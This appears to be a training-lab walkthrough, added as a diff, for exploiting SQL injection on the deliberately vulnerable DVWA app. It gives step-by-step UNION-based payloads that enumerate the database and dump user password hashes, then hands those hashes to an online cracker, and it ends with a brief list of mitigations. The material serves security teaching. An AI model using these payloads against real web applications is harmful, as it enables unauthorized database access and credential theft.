@@ -1,0 +1,51 @@
+SQL INJECTION
+SQL injection is a common attack used by hackers to exploit SQL database-driven web applications. This type of attack involves inserting malicious SQL code or statements into an input field or URL with the goal of reveling or manipulating the database contents, causing repudiation system issues, or spoofing identities.
+Exploit an SQL Injection Vulnerability on DVWA
+SQL injection is a code injection technique used to exploit security vulnerabilities in the database layer of an application. These vulnerabilities could allow an attacker to execute malicious SQL commands and compromise the security of the database.
+Prepare DVWA for SQL Injection Exploit.
+Open your browser and navigate to the DVWA at http://10.6.6.13.
+Enter the credentials: admin / password.
+Set DVWA to Low Security.
+Click DVWA Security in the left pane.
+Change the security level to Low and click Submit
+Step 2: Check DVWA to see if a SQL Injection Vulnerability is Present
+Click SQL Injection in the left pane.
+ In the User ID: field type ' OR 1=1 # and click Submit.
+You should receive the output shown below. 
+Step 3: Check for Number of Fields in the Query.
+ In the User ID: field type 1' ORDER BY 1 # and click Submit.
+You should receive the following output:
+ In the User ID: field type 1' ORDER BY 2 # and click Submit.
+You should receive the following output:
+ In the User ID: field type 1' ORDER BY 3 # and click Submit.
+This time you should receive the error Unknown column '3' in 'order clause'.
+Because the third string returned an error, this tells us the query involves two fields. This is useful information to know as you continue your exploit.
+Step 4: Check for version Database Management System (DBMS).
+ In the User ID: field type 1' OR 1=1 UNION SELECT 1, VERSION()# and click Submit.
+The output 5.5.58-0+deb8u1 indicates the DBMS is MySQL version 5.5.58 running on Debian.
+Step 5: Determine the database name.
+So far you have learned that the database is vulnerable, the query involves two fields, and the DDMS is MySQL 5.5.58.
+Next, you will attempt obtain more schema information about the database.
+ In the User ID: field type 1' OR 1=1 UNION SELECT 1, DATABASE()# and click Submit.
+This means the name of the database is dvwa.
+Step 6: Retrieve table Names from the dvwa database.
+ In the User ID: field type:
+1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
+Click Submit.
+Tables found; guestbook and users
+Step 7: Retrieve column names from the users table.
+You will now discover the field names in the users table. This will help you to find information that is useful for the pentest.
+ In the User ID: field type:
+1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
+Click Submit. The user column and the password column are of interest because they seem to contain information that can be used for unauthorized access.
+****Step 8: (Retrieve the user credentials).
+This query will retrieve the users and passwords.
+ In the User ID: field type:
+1' OR 1=1 UNION SELECT user, password FROM users #
+Click Submit.
+****Step 9: Hack the password hashes.(Cracking passwords)
+Open another browser tab and navigate to https://crackstation.net.
+CrackStation is a free online password hash cracker.
+Copy and paste the password hash from DVWA into CrackStation and click Crack Hashes.
+
+Three mitigation methods for preventing SQL injection exploits? using parameterized queries (prepared statements), input checking, field validation, filtering user inputs, and escaping user input.
